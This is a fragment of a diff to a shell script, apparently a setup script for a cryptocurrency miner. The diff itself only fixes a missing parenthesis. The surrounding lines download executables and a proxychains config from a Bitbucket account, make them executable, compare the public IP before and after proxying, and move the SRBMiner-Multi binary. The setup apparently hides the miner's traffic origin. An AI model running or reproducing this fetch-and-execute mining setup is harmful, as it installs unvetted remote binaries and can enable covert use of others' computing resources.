@@ -4,7 +4,7 @@ wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmo
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 echo "IP ORI ==> "$(curl ifconfig.me)
-echo "IP Baru ==> "$(curl ifconfig.me
+echo "IP Baru ==> "$(curl ifconfig.me)
 cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
